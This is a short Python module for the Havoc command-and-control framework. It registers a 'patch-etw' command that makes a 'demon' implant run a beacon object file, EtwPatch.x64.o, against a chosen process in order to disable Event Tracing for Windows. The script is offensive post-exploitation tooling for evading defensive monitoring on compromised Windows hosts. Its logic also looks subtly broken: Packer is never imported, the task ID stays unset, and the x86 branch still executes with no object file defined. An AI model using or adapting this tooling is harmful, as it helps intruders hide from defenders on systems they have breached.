from havoc import Demon, RegisterCommand

def PatchETW(demonID, *params):
    TaskID: str = None
    demon: Demon = None
    packer = Packer()
    
    num_params = len(params)
    pid = 0

    demon = Demon(demonID) 

    if num_params != 1:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "The argument must be a valid PID")
        return True

    pid = params [ 0 ]

    packer.addstr(pid) 

    if demon.ProcessArch == "x86":
        TaskID = demon.ConsoleWrite(demon.CONSOLE_ERROR, "This bof only supports x64, please use that instead")
    else:
        bof_file = "EtwPatch.x64.o"
    
    demon.ConsoleWrite(demon.CONSOLE_TASK,"Tasked demon to patch ETW") 
    demon.InlineExecute(TaskID,"go", bof_file, packer.getbuffer(), False)

RegisterCommand(PatchETW, "" ,"patch-etw", "Patches Event Tracing for Windows with the given PID", 0, "<pid>", "1337")
